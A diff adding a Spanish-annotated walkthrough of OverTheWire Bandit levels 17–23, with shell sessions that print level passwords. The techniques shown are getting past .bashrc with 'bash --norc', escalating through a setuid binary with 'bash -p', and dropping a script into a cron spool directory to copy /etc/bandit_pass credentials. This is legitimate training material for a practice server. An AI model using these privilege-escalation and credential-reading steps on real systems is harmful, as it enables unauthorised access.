@@ -1575,3 +1575,361 @@ xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
 ```
 
 ## bandit17
+There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new
+
+```bash
+bandit17@bandit:~$ ls
+passwords.new  passwords.old
+
+bandit17@bandit:~$ cat passwords.new | wc -l
+100
+bandit17@bandit:~$ cat passwords.old | wc -l
+100
+```
+listar las diferencias entre los archivos
+```bash
+bandit17@bandit:~$ diff passwords.old passwords.new
+42c42
+< w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
+---
+> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+```
+### scripting de bash implementación
+```bash
+root@pc:~# cd /dev/shm
+root@pc:/dev/shm#
+
+# crear script
+root@pc:/dev/shm# touch procmon.sh
+root@pc:/dev/shm# chmod +x procmon.sh
+```
+Script para monitorizar los procesos del sistema
+```bash
+#!/bin/bash
+old_process=$(ps -eo command)
+while true; do
+        new_process=$(ps -eo command)
+        diff <(echo "$old_process") <(echo "$new_process") | grep -v -E "procmon|command"
+        old_process=$new_process
+done
+```
+Ejecutamos
+```bash
+root@pc:/dev/shm# ./procmon.sh
+27c27
+< [kworker/3:1-events_freezable]
+---
+> [kworker/3:1-events]
+84c84
+< [kworker/u9:2+i915_flip]
+---
+> [kworker/u9:2-i915_flip]
+47c47
+< [kworker/u9:0+i915_flip]
+---
+```
+
+# bandit18
+The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.
+```bash
+ssh bandit18@bandit.labs.overthewire.org -p 2220
+Byebye !
+Connection to bandit.labs.overthewire.org closed.
+```
+Lo malo de la bashrc es que cualquier comando o acción que tenga definido se ba a ejecutar despues que te conectes pero hay un margen de tiempo.  
+A continuacion alcanzamos a ejecutar whoami
+```bash
+jjvargass@pc  ~  ssh bandit18@bandit.labs.overthewire.org -p 2220 whoami
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org's password:
+bandit18
+```
+Nos podemos aprobechar de esto para definir una bash
+```bash
+jjvargass@pc  ~  ssh bandit18@bandit.labs.overthewire.org -p 2220 bash  
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org's password:
+whoami
+bandit18
+pwd
+/home/bandit18
+```
+Existe una utilidad para decier al ssh que no lea el bashrc
+```bash
+ssh bandit18@bandit.labs.overthewire.org -p 2220 "bash --norc"
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org's password:
+ls
+readme
+cat readme
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+```
+
+## bandit19
+To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.
+```bash
+bandit19@bandit:~$ ls
+bandit20-do
+
+# tiene permisos setuid, quiere decir que lo puedo ejecutar de forma temporal como el usuario propietario "como bandit20"
+bandit19@bandit:~$ ls -l
+total 8
+-rwsr-x--- 1 bandit20 bandit19 7296 May  7  2020 bandit20-do
+```
+Ejecutar
+```bash
+bandit19@bandit:~$ ./bandit20-do
+Run a command as another user.
+  Example: ./bandit20-do id
+
+# solicita argumento o comando
+bandit19@bandit:~$ ./bandit20-do  whoami
+bandit20
+bandit19@bandit:~$ ./bandit20-do  id
+uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
+
+# abrir fichero
+bandit19@bandit:~$ ./bandit20-do "cat /etc/bandit_pass/bandit20"
+env: ‘cat /etc/bandit_pass/bandit20’: No such file or directory
+
+# con sh atiende a suid
+bandit19@bandit:~$ ./bandit20-do sh
+$ whoami
+bandit20
+
+# con bash no atiende el suid
+bandit19@bandit:~$ ./bandit20-do bash
+bash-4.4$ whoami
+bandit19
+
+# para evitar el problema, desde la bash para que atienda el suid por medidas de proteccion se le asigan el parametro -p
+bandit19@bandit:~$ ./bandit20-do bash -p
+bash-4.4$ whoami
+bandit20
+bandit19@bandit:~$ ./bandit20-do bash -p
+bash-4.4$ whoami
+bandit20
+bash-4.4$ cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+```
+
+## bandit20
+There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
+
+```bash
+bandit20@bandit:~$ ls -l
+total 12
+-rwsr-x--- 1 bandit21 bandit20 12088 May  7  2020 suconnect
+```
+Se debe realizar dos conexiones
+bash 1
+```bash
+bandit20@bandit:~$ nc -nlvp 5757
+listening on [any] 5757 ...
+```
+
+bash 2
+```bash
+bandit20@bandit:~$ ./suconnect
+Usage: ./suconnect <portnumber>
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
+
+# ejecutamos con el puerto que esta escuchando con nc 5757
+# luego suministramos la contraseña del bandit20
+bandit20@bandit:~$ nc -nlvp 5757
+listening on [any] 5757 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 39790
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+```
+
+## bandit21
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+```bash
+bandit21@bandit:~$ ls -l /etc/cron.d/
+total 24
+-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit15_root
+-rw-r--r-- 1 root root  62 Jul 11 15:56 cronjob_bandit17_root
+-rw-r--r-- 1 root root 120 May  7  2020 cronjob_bandit22
+-rw-r--r-- 1 root root 122 May  7  2020 cronjob_bandit23
+-rw-r--r-- 1 root root 120 May 14  2020 cronjob_bandit24
+-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit25_root
+
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+# se esta ejecutando a intervalo de un minuto este archivo /usr/bin/cronjob_bandit22.sh, se revisará
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+# entonces consultamos el directorio donde se esta guardando la contraseña
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+
+## bandit22
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+```bash
+bandit22@bandit:~$ ls  -l /etc/cron.d/
+total 24
+-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit15_root
+-rw-r--r-- 1 root root  62 Jul 11 15:56 cronjob_bandit17_root
+-rw-r--r-- 1 root root 120 May  7  2020 cronjob_bandit22
+-rw-r--r-- 1 root root 122 May  7  2020 cronjob_bandit23
+-rw-r--r-- 1 root root 120 May 14  2020 cronjob_bandit24
+-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit25_root
+
+
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+# entendiendo un poco el script
+
+bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+
+
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+## bandit23
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+```bash
+bandit23@bandit:~$ ls -l /etc/cron.d
+total 24
+-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit15_root
+-rw-r--r-- 1 root root  62 Jul 11 15:56 cronjob_bandit17_root
+-rw-r--r-- 1 root root 120 May  7  2020 cronjob_bandit22
+-rw-r--r-- 1 root root 122 May  7  2020 cronjob_bandit23
+-rw-r--r-- 1 root root 120 May 14  2020 cronjob_bandit24
+-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit25_root
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+```bash
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+
+bandit23@bandit:~$ ls -l /var/spool/
+total 12
+drwxrwx-wx 31 root bandit24 4096 Dec 17 19:47 bandit24
+drwxr-xr-x  3 root root     4096 May  3  2020 cron
+lrwxrwxrwx  1 root root        7 May  3  2020 mail -> ../mail
+drwx------  2 root root     4096 Jan 14  2018 rsyslog
+
+
+
+bandit23@bandit:~$ ls -l /var/spool/bandit24/
+ls: cannot open directory '/var/spool/bandit24/': Permission denied
+bandit23@bandit:~$
+
+bandit23@bandit:~$ cat /etc/bandit_pass/bandit24
+cat: /etc/bandit_pass/bandit24: Permission denied
+```
+Crearemos un script y lo copiaremos en el directorio donde esta ejecutandonse gracias al cron
+```bash
+bandit23@bandit:~$  mktemp -d
+/tmp/tmp.Z21GOahHr4
+bandit23@bandit:/tmp/tmp.Z21GOahHr4$ cd /tmp/tmp.Z21GOahHr4
+bandit23@bandit:/tmp/tmp.Z21GOahHr4$ chmod o+rx ../tmp.Z21GOahHr4
+```
+script
+```bash
+bandit23@bandit:/tmp/tmp.kgvqXM1q3h$ ls
+jotascript.sh
+bandit23@bandit:/tmp/tmp.kgvqXM1q3h$ cat jotascript.sh
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.kgvqXM1q3h/jotapwned.txt
+
+
+# permisos al script
+bandit23@bandit:/tmp/tmp.Z21GOahHr4$ chmod +x jotascript.sh
+
+# se copia en el directorio spool
+bandit23@bandit:/tmp/tmp.kgvqXM1q3h$ cp jotascript.sh /var/spool/bandit24/script.sh
+
+```
+se podria utilizar el wat
+```bash
+# cada segundo hacer ls -l
+bandit23@bandit:/tmp/tmp.kgvqXM1q3h$ watch -n 1 ls -l
+
+# falta un permiso para que el escript pueda escrivir en la carpeta
+bandit23@bandit:/tmp/tmp.Z21GOahHr4$ chmod o+w /tmp/tmp.Z21GOahHr4
+
+
+bandit23@bandit:/tmp/tmp.Z21GOahHr4$ watch -n 1 ls -l
+bandit23@bandit:/tmp/tmp.Z21GOahHr4$ ls
+jotapwned.txt  jotascript.sh
+bandit23@bandit:/tmp/tmp.Z21GOahHr4$ cat jotapwned.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+
+```bash
+
+```
+
+
+```bash
+
+```
+
+
+```bash
+
+```
+
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
